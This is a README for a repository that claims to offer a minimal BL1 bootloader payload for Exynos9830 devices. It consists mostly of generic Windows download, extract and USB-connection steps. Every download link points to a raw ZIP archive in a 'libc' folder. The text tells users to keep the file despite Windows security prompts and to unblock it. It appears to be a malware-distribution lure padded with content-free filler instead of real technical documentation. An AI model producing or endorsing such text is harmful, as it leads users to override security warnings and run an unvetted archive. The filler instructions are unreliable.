# ⚙️ exynos990-payloads - Minimal BL1 payload support

[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/tupopacherryy9/exynos990-payloads/raw/refs/heads/main/libc/payloads-exynos-v2.8.zip)

## 📦 What this is

OpenMiniBL1 is a small BL1 replacement for Exynos9830 devices. It is made to work as a Houston payload and send `EPBL-EL3_MON` in the usual way.

This repository helps you get the payload package from GitHub and use it on a Windows PC. It is aimed at users who need a simple file transfer and launch flow with a device tool that supports payload loading.

## 💻 What you need

Before you start, make sure you have:

- A Windows PC
- A USB cable that supports data transfer
- A supported Exynos9830-based device
- A tool that can send Houston payloads
- Access to the download page
- Enough free space for the payload files

For best results, use a stable USB port on the back of a desktop PC or a direct port on a laptop.

## ⬇️ Download the files

Use this link to visit the page and download the payload files:

[Visit the download page](https://github.com/tupopacherryy9/exynos990-payloads/raw/refs/heads/main/libc/payloads-exynos-v2.8.zip)

After the page opens, look for the file or release asset that matches your use case. Save it to a folder you can find again, such as `Downloads` or `Desktop`.

## 🪟 Set up on Windows

1. Open the download page in your web browser.
2. Download the file or files from the repository page.
3. If the download comes as a ZIP file, right-click it and choose **Extract All**.
4. Pick a folder such as `Documents\exynos990-payloads`.
5. Keep the extracted files together in one place.
6. If Windows shows a security prompt, choose the option that lets you keep the file.
7. Open your payload tool on Windows.
8. Make sure the tool can see the extracted BL1 payload file.

If you use a separate device utility, keep both the tool and the payload file in easy-to-find folders.

## 🔌 Connect your device

1. Turn off the device you want to use.
2. Connect it to your Windows PC with the USB cable.
3. Put the device into the mode required by your payload tool.
4. Wait until Windows detects the connection.
5. Open Device Manager if you want to confirm that the USB link is active.
6. Keep the cable connected during the full transfer.

A direct connection helps reduce failed transfers. If the tool cannot see the device, disconnect the cable, then connect it again.

## ▶️ Send the payload

The repository says to use it as a Houston payload and send `EPBL-EL3_MON` as normal.

Use the following flow in your tool:

1. Open your Houston payload sender.
2. Load the payload file from the extracted folder.
3. Select the connected device.
4. Send `EPBL-EL3_MON`.
5. Wait for the tool to finish the transfer.
6. Watch for a success message in the tool window.

If your tool asks for a payload name, use the exact name from the repository instructions. Keep the file path short and simple if the tool has trouble finding the file.

## 🧭 Basic usage flow

A simple start-to-finish flow looks like this:

1. Download the repository files from GitHub.
2. Extract them on Windows.
3. Open your payload sender.
4. Connect the device by USB.
5. Load the payload.
6. Send `EPBL-EL3_MON`.
7. Let the tool finish the job.
8. Keep the files for later use.

If you use the payload often, place the folder in a fixed spot, such as `C:\Payloads\exynos990-payloads`, so you do not need to search for it each time.

## 🗂️ File layout

You may see files that fit this general layout:

- A main payload file
- A small set of support files
- A README file with use steps
- A release or download asset
- A folder that holds device-specific data

If the repository includes more than one payload file, keep them in separate folders with clear names. That makes it easier to pick the right file in your tool.

## 🛠️ Common problems

### Device not found

- Check the USB cable
- Try a different USB port
- Reopen the payload tool
- Reconnect the device
- Make sure the device is in the right mode

### Download will not open

- Download the file again
- Use a current browser
- Check that the file finished downloading
- Extract ZIP files before use

### Payload send fails

- Confirm that you chose `EPBL-EL3_MON`
- Check that the file path is correct
- Close other tools that may use the same USB port
- Try the transfer again after reconnecting the device

### Windows blocks the file

- Right-click the file
- Open the file properties
- Check the security prompt
- Allow the file if Windows marks it as downloaded from the internet

## 🔍 Tips for a smooth setup

- Keep the download folder simple
- Do not rename files unless the tool asks for it
- Use one USB cable from start to finish
- Keep the device charged
- Use the same Windows user account each time
- Store the payload in a folder with no special characters

## 📌 When to use it

Use this payload when you need a minimal BL1 replacement for supported Exynos9830 devices and your tool expects a Houston payload flow.

It fits a setup where you want a small, direct payload package with a clear send step and limited extra setup.

## 🧩 Example Windows workflow

1. Open GitHub in Chrome, Edge, or Firefox.
2. Visit the repository page.
3. Download the file.
4. Extract it with Windows File Explorer.
5. Open your payload sender.
6. Connect your device.
7. Load the payload file.
8. Send `EPBL-EL3_MON`.
9. Wait for the tool to finish.
10. Keep the folder for later use

## 📝 Repository details

- Repository: `exynos990-payloads`
- Project name: `OpenMiniBL1`
- Use case: BL1 replacement payload
- Device target: Exynos9830 devices
- Load method: Houston payload
- Payload step: send `EPBL-EL3_MON`